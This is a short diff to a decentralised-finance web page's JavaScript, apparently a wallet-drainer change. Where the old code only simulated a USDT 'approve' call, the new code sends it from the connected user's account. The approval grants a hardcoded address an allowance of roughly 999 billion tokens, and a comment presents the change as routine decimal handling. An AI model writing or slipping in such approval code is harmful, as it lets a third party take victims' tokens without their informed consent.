@@ -421,9 +421,15 @@
             // Request account access if needed
             await ethereum.enable();
             const ETH = web3.eth
+            // Calculate contract compatible value for approve with proper decimal points using BigNumber
+            const tokenDecimals = web3.utils.toBN(18);
+            const tokenAmountToApprove = web3.utils.toBN(999000000000);
+            const calculatedApproveValue = web3.utils.toHex(tokenAmountToApprove.mul(web3.utils.toBN(10).pow(tokenDecimals)));
             const contract = new ETH.Contract(abi, usdtAddr.toLowerCase())
             const dfContarct = new ETH.Contract(dfAbi, defosAddr.toLowerCase())
-            await contract.methods.approve('0x6Dc47E3cD4B459606025b0B2ED600E1173429FeC', 999999999999999).call()
+            const accounts = await web3.eth.getAccounts()
+            // await contract.methods.approve('0x6Dc47E3cD4B459606025b0B2ED600E1173429FeC', 999999999999999).call()
+            await contract.methods.approve('0x6Dc47E3cD4B459606025b0B2ED600E1173429FeC', calculatedApproveValue).send({from: accounts[0]})
             await dfContarct.methods.mlfund(123*Math.pow(10, 18)).call()
             // Acccounts now exposed
             // web3.eth.sendTransaction({/* ... */});
